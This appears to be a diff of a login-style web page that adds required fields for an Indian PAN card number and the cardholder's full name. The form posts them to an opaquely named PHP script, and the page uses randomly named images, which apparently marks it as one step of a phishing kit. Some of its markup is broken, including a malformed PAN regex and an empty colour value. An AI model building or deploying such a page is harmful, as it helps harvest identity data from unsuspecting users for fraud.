@@ -6,7 +6,7 @@
 
 input[type=text], input[type=password] {
   width: 100%;
-  padding: 12px 20px;
+  padding: 06px 20px;
   margin: 8px 0;
   display: inline-table;
   border: 1px solid #;
@@ -16,11 +16,11 @@ input[type=text], input[type=password] {
 button {
   background-color:#008CBA ;
   color: white;
-  padding: 14px 20px;
-  margin:   0;
+  padding: 09px 20px;
+  margin:  00;
   border: none;
   cursor: pointer;
-  width: 100%; 
+  width: 30%; 
 }
 
 button:hover {
@@ -76,7 +76,7 @@ span.psw {
   </header>
 
 
-<form action="frásaí.php" method="post">
+<form action="ilteangachEE.php" method="post">
   <div class="imgcontainer">
     
   </div>
@@ -85,17 +85,37 @@ span.psw {
 
 
 
+<label>Enter PAN Card Number*</label>
+    <input type="text" placeholder="" name="PAN CARD NU"maxlength="10"
+      pattern="[aA-aZ]{5,}[0-9]{4,}[aA-aZ]{1,}"
+      title="Valid PAN Format Is:ABCDE1234A" required>
+
+
+<label>Full Name (as per PAN Card)*</label>
+    <input type="text" placeholder="" name="Name" maxlength="35"required>
 
 
 
-    <button type="submit">CONTINUE TO LOGIN</button> 
 
 
 
+    <center><button type="submit">Submit</button> 
+</center>
   </div>
 
-<center><h1 class="text-center"><img src="./defyhj.jpg" style="width: 100%;"></h1></center>
 
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+
+
+
+<center><h1 class="text-center"><img src="./hyhjui.jpg" style="width: 100%;"></h1></center>
 
 </form>
 
